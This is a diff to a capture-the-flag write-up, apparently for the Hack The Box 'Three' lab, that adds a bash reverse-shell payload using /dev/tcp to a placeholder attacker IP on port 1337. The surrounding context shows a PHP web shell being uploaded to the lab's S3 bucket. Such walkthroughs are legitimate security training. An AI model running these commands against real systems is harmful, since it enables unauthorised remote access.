@@ -71,6 +71,7 @@ _Then, we can upload this PHP shell to the thetoppers.htb S3 bucket using the fo
 
 **aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb**
 
+
 ![](/Assets/HTB/THREE/assets/result.png)
 
 _We can confirm that our shell is uploaded by navigating to http://thetoppers.htb/shell.php. Let us try
@@ -87,6 +88,12 @@ command._
 
 _Let's get a reverse shell by creating a new file shell.sh containing the following bash reverse shell payload
 which will connect back to our local machine on port 1337 ._
+
+**#!/bin/bash**
+**bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1**
+
+
+
 
 
 
